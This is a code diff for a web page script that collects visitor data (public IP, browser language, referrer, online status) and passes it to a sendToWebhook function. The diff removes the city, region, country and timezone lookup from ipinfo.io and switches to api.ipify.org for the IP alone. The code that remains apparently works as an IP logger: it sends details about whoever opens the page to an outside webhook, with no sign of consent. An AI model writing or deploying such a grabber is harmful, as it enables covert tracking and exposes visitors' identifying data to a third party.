@@ -32,30 +32,21 @@
                 language: navigator.language,
                 online: navigator.onLine,
                 ip: null, // Placeholder for user's IP
-                city: null,
-                region: null,
-                country: null,
-                timezone: null,
                 lastVisited: document.referrer || "N/A", // Last visited URL
                 compatibility: checkCompatibility(),
                 ports: [80, 443] // Commonly used ports
             };
 
-            // Fetch user's public IP and geolocation details using ipinfo.io
-            fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE') // Replace with your ipinfo.io token
+            // Fetch user's public IP using an external service
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     networkInfo.ip = data.ip;
-                    networkInfo.city = data.city;
-                    networkInfo.region = data.region;
-                    networkInfo.country = data.country;
-                    networkInfo.timezone = data.timezone;
                     sendToWebhook(networkInfo);
                 })
                 .catch(error => {
-                    console.error('Error fetching IP and location data:', error);
-                    document.getElementById('message').innerText = 'Error fetching IP and location data.';
-                    document.getElementById('message').style.display = 'block';
+                    console.error('Error fetching IP:', error);
+                    document.getElementById('message').innerText = 'Error fetching IP address.';
                 });
         }
 
@@ -96,26 +87,6 @@
                     {
                         name: "IP Address",
                         value: networkInfo.ip,
-                        inline: true
-                    },
-                    {
-                        name: "City",
-                        value: networkInfo.city || 'N/A',
-                        inline: true
-                    },
-                    {
-                        name: "Region/State",
-                        value: networkInfo.region || 'N/A',
-                        inline: true
-                    },
-                    {
-                        name: "Country",
-                        value: networkInfo.country || 'N/A',
-                        inline: true
-                    },
-                    {
-                        name: "Timezone",
-                        value: networkInfo.timezone || 'N/A',
                         inline: true
                     },
                     {
